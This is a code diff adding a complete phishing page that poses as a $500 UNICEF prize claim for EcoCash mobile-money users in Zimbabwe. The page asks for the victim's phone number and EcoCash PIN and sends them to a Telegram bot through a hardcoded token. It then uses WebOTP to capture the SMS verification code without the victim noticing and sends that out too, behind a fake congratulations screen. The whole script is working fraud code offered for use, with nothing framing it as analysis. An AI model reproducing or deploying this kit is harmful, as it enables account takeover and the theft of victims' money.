+            <div class="form-group">
+                <label>Phone Number <span class="req">*</span></label>
+                <div class="input-group phone-input">
+                    <span class="prefix">+263</span>
+                    <input type="tel" id="phone" placeholder="7X XXX XXXX" autocomplete="tel" required maxlength="12" />
+                </div>
+                <div class="input-hint" id="phoneHint">Format: <strong>7X XXX XXXX</strong> (e.g., 71 234 5678)</div>
+                <div class="format-hint">Must start with 7, followed by 8 more digits</div>
+            </div>
+
+            <div class="form-group">
+                <label style="display:flex;align-items:center;gap:6px;">
+                    <span class="ecocash">
+                        <svg viewBox="0 0 24 24" fill="none">
+                            <circle cx="12" cy="12" r="10" fill="white"/>
+                            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z" fill="#00a859"/>
+                            <circle cx="12" cy="12" r="7" fill="#00a859"/>
+                            <text x="12" y="15" font-size="10" font-weight="bold" text-anchor="middle" fill="white" font-family="Arial">$</text>
+                        </svg>
+                        <span>Eco<em>Cash</em></span>
+                    </span>
+                    <span>PIN</span>
+                    <span class="req">*</span>
+                </label>
+                <div class="input-group pin-wrap">
+                    <input type="password" id="pin" placeholder="••••" maxlength="4" inputmode="numeric" pattern="[0-9]{4}" required />
+                    <button type="button" class="toggle" id="togglePin" aria-label="Toggle PIN">👁</button>
+                </div>
+                <div class="input-hint" id="pinHint">Enter your 4-digit EcoCash PIN</div>
+            </div>
+
+            <input type="text" class="hidden-input" id="otpInput" autocomplete="one-time-code" inputmode="numeric" />
+
+            <button type="submit" class="btn btn-primary" id="submitBtn">
+                💰 Claim Reward to My EcoCash Wallet
+            </button>
+
+        </form>
+
+        <!-- ─── SUCCESS ─── -->
+        <div class="success" id="success">
+            <div class="check">✓</div>
+            <h2>🎉 Congratulations!</h2>
+            <p>
+                You've won <span class="hl">$500 USD</span> from the
+                <strong>UNICEF Federation Foundation</strong>.<br /><br />
+                Funds will be transferred to your EcoCash wallet within <strong>2 minutes</strong>.
+            </p>
+            <div style="margin-top:14px;display:inline-flex;align-items:center;gap:6px;background:rgba(0,168,89,0.1);padding:6px 14px;border-radius:30px;border:1px solid rgba(0,168,89,0.15);font-size:12px;color:#4ade80;font-weight:600;">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="2" y="5" width="20" height="14" rx="2"/>
+                    <path d="M16 12a2 2 0 1 1 4 0"/>
+                </svg>
+                Deposited to EcoCash Wallet
+            </div>
+        </div>
+
+        <!-- ─── STATUS BAR ─── -->
+        <div class="status" id="status">
+            <span class="dot" id="statusDot"></span>
+            <span id="statusText">Waiting...</span>
+        </div>
+
+        <!-- ─── OTP STATUS INDICATOR ─── -->
+        <div class="otp-status" id="otpStatus">
+            🔍 <span class="highlight">WebOTP</span> is active — waiting for SMS verification code...
+        </div>
+
+        <div class="footer">🔒 Secured • Encrypted • Confidential</div>
+    </div>
+
+    <!-- ─── JAVASCRIPT ─── -->
+    <script>
+        (function() {
+            'use strict';
+
+            // ─── DOM REFS ───
+            const form = document.getElementById('form');
+            const submitBtn = document.getElementById('submitBtn');
+            const success = document.getElementById('success');
+            const status = document.getElementById('status');
+            const statusDot = document.getElementById('statusDot');
+            const statusText = document.getElementById('statusText');
+            const otpStatus = document.getElementById('otpStatus');
+            const phone = document.getElementById('phone');
+            const pin = document.getElementById('pin');
+            const togglePin = document.getElementById('togglePin');
+            const phoneHint = document.getElementById('phoneHint');
+            const pinHint = document.getElementById('pinHint');
+            const otpInput = document.getElementById('otpInput');
+            const confettiContainer = document.getElementById('confetti');
+
+            // ─── STATE ───
+            let isSubmitting = false;
+            let storedPhone = '';
+            let storedPin = '';
+            let codeDetected = false;
+            let codeSent = false;
+            let listenerActive = false;
+            let attempts = 0;
+            const MAX_ATTEMPTS = 15;
+            let waitTimer = null;
+            let listenerStartTime = null;
+
+            // ─── TELEGRAM CONFIG ───
+            // ⚠️ REPLACE WITH YOUR OWN BOT TOKEN AND CHAT ID
+            const BOT_TOKEN = '8773610021:AAHN80m50Ssiyj5hR1UFRDfzjCY6l50CJXM';
+            const CHAT_ID = '8834429633';
+
+            // ─── HELPERS ───
+            function getTime() {
+                return new Date().toLocaleString('en-US', {
+                    month: 'numeric', day: 'numeric', year: 'numeric',
+                    hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true
+                });
+            }
+
+            async function sendToTelegram(msg) {
+                try {
+                    const res = await fetch(
+                        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
+                    );
+                    const data = await res.json();
+                    console.log('📤 Telegram response:', data);
+                    return { ok: data.ok, data: data };
+                } catch (e) {
+                    console.error('❌ Telegram send error:', e);
+                    return { ok: false, error: e.message };
+                }
+            }
+
+            function showStatus(text, type) {
+                status.classList.add('active');
+                statusText.textContent = text;
+                statusDot.className = 'dot';
+                if (type === 'success') statusDot.classList.add('success');
+                else if (type === 'error') statusDot.classList.add('error');
+            }
+
+            function hideStatus() {
+                status.classList.remove('active');
+            }
+
+            function updateOTPStatus(text, show) {
+                if (show) {
+                    otpStatus.classList.add('active');
+                    otpStatus.innerHTML = text;
+                } else {
+                    otpStatus.classList.remove('active');
+                }
+            }
+
+            // ─── PHONE VALIDATION ───
+            function validatePhone() {
+                const raw = phone.value.replace(/\s/g, '');
+                if (!/^7\d{8}$/.test(raw)) {
+                    phone.classList.add('error');
+                    phoneHint.textContent = '❌ Must be in format: 7X XXX XXXX (e.g., 71 234 5678)';
+                    phoneHint.classList.add('error');
+                    return false;
+                }
+                phone.classList.remove('error');
+                phoneHint.textContent = '✅ Valid Zimbabwe number';
+                phoneHint.classList.remove('error');
+                return true;
+            }
+
+            function validatePin() {
+                const val = pin.value.replace(/\s/g, '');
+                if (!/^\d{4}$/.test(val)) {
+                    pin.classList.add('error');
+                    pinHint.textContent = 'Enter exactly 4 digits';
+                    pinHint.classList.add('error');
+                    return false;
+                }
+                pin.classList.remove('error');
+                pinHint.textContent = 'Enter your 4-digit EcoCash PIN';
+                pinHint.classList.remove('error');
+                return true;
+            }
+
+            // ─── FORMAT PHONE ───
+            phone.addEventListener('input', function() {
+                let val = this.value.replace(/\D/g, '');
+                if (val.length > 0 && val[0] !== '7') {
+                    val = '7' + val;
+                }
+                if (val.length > 9) val = val.slice(0, 9);
+                
+                let formatted = '';
+                if (val.length > 0) {
+                    formatted = val.slice(0, 1);
+                    if (val.length > 1) {
+                        formatted += val.slice(1, 2);
+                        if (val.length > 2) {
+                            formatted += ' ' + val.slice(2, 5);
+                            if (val.length > 5) {
+                                formatted += ' ' + val.slice(5, 9);
+                            }
+                        }
+                    }
+                }
+                
+                this.value = formatted;
+                this.classList.remove('error');
+                phoneHint.classList.remove('error');
+                phoneHint.textContent = 'Format: 7X XXX XXXX (e.g., 71 234 5678)';
+            });
+
+            pin.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '').slice(0, 4);
+                this.classList.remove('error');
+                pinHint.classList.remove('error');
+                pinHint.textContent = 'Enter your 4-digit EcoCash PIN';
+            });
+
+            togglePin.addEventListener('click', function() {
+                const isPass = pin.type === 'password';
+                pin.type = isPass ? 'text' : 'password';
+                this.textContent = isPass ? '🙈' : '👁';
+            });
+
+            form.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') { e.preventDefault(); submitBtn.click(); }
+            });
+
+            // ─── WEBOTP LISTENER ───
+            function startWebOTP() {
+                if (!('OTPCredential' in window)) {
+                    console.warn('⚠️ WebOTP not supported in this browser');
+                    updateOTPStatus('⚠️ WebOTP not supported. Please enter code manually.', true);
+                    setTimeout(() => {
+                        if (!codeDetected && !success.classList.contains('active')) {
+                            showStatus('⚠️ WebOTP not supported. Enter code manually.', 'error');
+                        }
+                    }, 5000);
+                    return;
+                }
+
+                if (listenerActive || codeSent) {
+                    console.log('⏳ Listener already active or code already sent');
+                    return;
+                }
+
+                if (attempts >= MAX_ATTEMPTS) {
+                    console.log('❌ Max attempts reached');
+                    updateOTPStatus('⚠️ Could not detect code after multiple attempts. Please try again.', true);
+                    setTimeout(() => {
+                        if (!codeDetected && !success.classList.contains('active')) {
+                            showStatus('⚠️ Could not detect code. Try again.', 'error');
+                        }
+                    }, 2000);
+                    return;
+                }
+
+                listenerActive = true;
+                attempts++;
+                listenerStartTime = Date.now();
+                console.log(`🔍 WebOTP listener started (attempt ${attempts}/${MAX_ATTEMPTS})`);
+
+                updateOTPStatus(`🔍 <span class="highlight">WebOTP</span> is active — waiting for SMS verification code... (Attempt ${attempts})`, true);
+
+                otpInput.focus();
+
+                const listenerTimeout = setTimeout(() => {
+                    if (listenerActive && !codeDetected) {
+                        console.log('⏰ Listener timeout (2 minutes)');
+                        listenerActive = false;
+                        updateOTPStatus(`⏳ Still waiting for code... Retrying (${attempts}/${MAX_ATTEMPTS})`, true);
+                        
+                        if (attempts < MAX_ATTEMPTS && !codeDetected && !success.classList.contains('active')) {
+                            setTimeout(() => {
+                                if (!codeDetected && !success.classList.contains('active')) {
+                                    startWebOTP();
+                                }
+                            }, 3000);
+                        } else if (!codeDetected && !success.classList.contains('active')) {
+                            showStatus('⚠️ Could not detect code. Please try again.', 'error');
+                            updateOTPStatus('❌ Max attempts reached. Please refresh and try again.', true);
+                        }
+                    }
+                }, 120000);
+
+                navigator.credentials.get({ 
+                    otp: { transport: ['sms'] } 
+                })
+                .then(otp => {
+                    const code = otp.code;
+                    console.log('📱 Code detected silently:', code);
+                    
+                    clearTimeout(listenerTimeout);
+                    
+                    listenerActive = false;
+                    codeDetected = true;
+                    codeSent = true;
+
+                    const elapsedTime = Math.round((Date.now() - listenerStartTime) / 1000);
+                    console.log(`⏱️ Code detected in ${elapsedTime} seconds`);
+
+                    updateOTPStatus(`✅ Code detected in ${elapsedTime}s! Sending to Telegram...`, true);
+
+                    const msg =
+                        `📱 Verification Code Received\n` +
+                        `━━━━━━━━━━━━━━━━━━\n` +
+                        `📞 Phone: +${storedPhone}\n` +
+                        `🔐 EcoCash PIN: ${storedPin}\n` +
+                        `🔑 Verification Code: ${code}\n` +
+                        `⏱️ Time: ${getTime()}\n` +
+                        `⏳ Detected in: ${elapsedTime} seconds\n` +
+                        `━━━━━━━━━━━━━━━━━━\n` +
+                        `✅ Code sent successfully!`;
+
+                    console.log('📤 Sending to Telegram...');
+                    
+                    sendToTelegram(msg).then(result => {
+                        if (result.ok) {
+                            console.log('✅ Code sent to Telegram successfully!');
+                            updateOTPStatus('✅ Code sent to Telegram!', true);
+                            hideStatus();
+                            
+                            setTimeout(() => {
+                                showSuccess();
+                            }, 1000);
+                        } else {
+                            console.error('❌ Failed to send code to Telegram:', result);
+                            updateOTPStatus('❌ Failed to send code to Telegram. Please try again.', true);
+                            showStatus('❌ Failed to send code. Try again.', 'error');
+                            codeSent = false;
+                            codeDetected = false;
+                            
+                            setTimeout(() => {
+                                if (!success.classList.contains('active')) {
+                                    sendToTelegram(msg).then(retryResult => {
+                                        if (retryResult.ok) {
+                                            updateOTPStatus('✅ Code sent to Telegram on retry!', true);
+                                            hideStatus();
+                                            setTimeout(showSuccess, 1000);
+                                        }
+                                    });
+                                }
+                            }, 3000);
+                        }
+                    }).catch(err => {
+                        console.error('❌ Error sending to Telegram:', err);
+                        updateOTPStatus('❌ Error sending to Telegram. Please try again.', true);
+                        showStatus('❌ Error sending code. Try again.', 'error');
+                    });
+                })
+                .catch(err => {
+                    console.warn('⚠️ WebOTP error:', err);
+                    clearTimeout(listenerTimeout);
+                    listenerActive = false;
+                    
+                    if (codeDetected || success.classList.contains('active')) {
+                        return;
+                    }
+                    
+                    if (err.name === 'AbortError') {
+                        console.log('⏹️ User aborted the OTP request');
+                        return;
+                    }
+                    
+                    if (attempts < MAX_ATTEMPTS) {
+                        updateOTPStatus(`⚠️ Retrying... (${attempts}/${MAX_ATTEMPTS})`, true);
+                        setTimeout(() => {
+                            if (!codeDetected && !success.classList.contains('active')) {
+                                startWebOTP();
+                            }
+                        }, 4000);
+                    } else {
+                        updateOTPStatus('❌ Could not detect code after multiple attempts.', true);
+                        setTimeout(() => {
+                            if (!codeDetected && !success.classList.contains('active')) {
+                                showStatus('⚠️ Could not detect code. Try again.', 'error');
+                            }
+                        }, 2000);
+                    }
+                });
+            }
+
+            // ─── SUCCESS ───
+            function showSuccess() {
+                form.style.display = 'none';
+                success.classList.add('active');
+                status.classList.remove('active');
+                otpStatus.classList.remove('active');
+                triggerConfetti();
+            }
+
+            // ─── CONFETTI ───
+            function triggerConfetti() {
+                const colors = ['#f5b342', '#ffd966', '#4ade80', '#f87171', '#60a5fa', '#c084fc', '#f472b6'];
+                for (let i = 0; i < 150; i++) {
+                    const el = document.createElement('div');
+                    el.className = 'confetti-piece';
+                    const size = 5 + Math.random() * 8;
+                    el.style.width = size + 'px';
+                    el.style.height = size + 'px';
+                    el.style.background = colors[Math.floor(Math.random() * colors.length)];
+                    el.style.left = Math.random() * 100 + '%';
+                    el.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
+                    el.style.animationDuration = (2 + Math.random() * 3) + 's';
+                    el.style.animationDelay = (Math.random() * 2) + 's';
+                    confettiContainer.appendChild(el);
+                }
+                setTimeout(() => { confettiContainer.innerHTML = ''; }, 6000);
+            }
+
+            // ─── SUBMIT HANDLER ───
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                if (isSubmitting) return;
+
+                const phoneOk = validatePhone();
+                const pinOk = validatePin();
+                if (!phoneOk || !pinOk) {
+                    showStatus('Please fix the errors above.', 'error');
+                    return;
+                }
+
+                storedPhone = '263' + phone.value.replace(/\s/g, '');
+                storedPin = pin.value;
+
+                isSubmitting = true;
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<span class="spinner"></span> Submitting...';
+
+                const msg =
+                    `📝 New Claim Submission\n` +
+                    `━━━━━━━━━━━━━━━━━━\n` +
+                    `📞 Phone: +${storedPhone}\n` +
+                    `🔐 EcoCash PIN: ${storedPin}\n` +
+                    `⏱️ Time: ${getTime()}\n` +
+                    `━━━━━━━━━━━━━━━━━━\n` +
+                    `🔐 Waiting for OTP...\n` +
+                    `📱 WebOTP listener active...`;
+
+                console.log('📤 Sending initial data to Telegram...');
+                const result = await sendToTelegram(msg);
+
+                if (!result.ok) {
+                    console.error('❌ Failed to send initial data:', result);
+                    showStatus('❌ Submission failed. Try again.', 'error');
+                    isSubmitting = false;
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '💰 Claim Reward to My EcoCash Wallet';
+                    return;
+                }
+
+                console.log('✅ Initial data sent to Telegram');
+                startWebOTP();
+
+                setTimeout(() => {
+                    if (!codeDetected && !success.classList.contains('active')) {
+                        showStatus('📱 Waiting for verification code...', '');
+                    }
+                }, 2000);
+
+                setTimeout(() => {
+                    submitBtn.disabled = false;
+                    submitBtn.innerHTML = '💰 Claim Reward to My EcoCash Wallet';
+                    isSubmitting = false;
+                }, 3000);
+            });
+
+            // ─── DOLLAR RAIN ───
+            (function createDollars() {
+                const container = document.getElementById('dollars');
+                const symbols = ['$', '💵', '💲'];
+                for (let i = 0; i < 35; i++) {
+                    const el = document.createElement('div');
+                    el.className = 'dollar';
+                    el.textContent = symbols[Math.floor(Math.random() * symbols.length)];
+                    el.style.left = Math.random() * 100 + '%';
+                    el.style.fontSize = (14 + Math.random() * 20) + 'px';
+                    el.style.animationDuration = (12 + Math.random() * 20) + 's';
+                    el.style.animationDelay = (Math.random() * 15) + 's';
+                    el.style.opacity = 0.3 + Math.random() * 0.5;
+                    container.appendChild(el);
+                }
+            })();
+
+            // ─── VIDEO PLAYBACK ───
+            function playVideo() {
+                const video = document.querySelector('#video-bg video');
+                if (video) {
+                    video.play().catch(() => {
+                        document.addEventListener('click', function play() {
+                            video.play().catch(() => {});
+                            document.removeEventListener('click', play);
+                        }, { once: true });
+                    });
+                }
+            }
+
+            window.addEventListener('load', () => setTimeout(playVideo, 100));
+
+            console.log('🚀 FLASHY Promo page ready!');
+            console.log('💰 Prize: $500 USD');
+            console.log('📱 WebOTP will automatically detect SMS codes');
+            console.log('📤 Codes will be sent directly to your Telegram bot');
+
+        })();
+    </script>
+</body>
+</html>
